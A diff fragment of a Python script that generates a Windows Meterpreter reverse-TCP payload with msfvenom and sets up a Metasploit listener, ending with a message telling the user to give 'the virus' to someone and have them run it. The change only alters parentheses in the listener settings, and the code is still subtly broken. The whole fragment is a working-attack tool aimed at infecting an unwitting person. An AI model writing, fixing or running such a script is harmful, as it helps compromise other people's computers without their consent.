@@ -5,6 +5,6 @@ os.system("msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86
 os.system("msfconsole")
 os.system("use multi/handler")
 os.system("set payload windows/meterpreter/reverse_tcp")
-os.system("set LHOST" % LHOST))
-os.system("set LPORT" % LPORT))
+os.system("set LHOST" % (LHOST))
+os.system("set LPORT" % (LPORT))
 print ("Now go give the virus in your desktop folder to someone have them run it!")
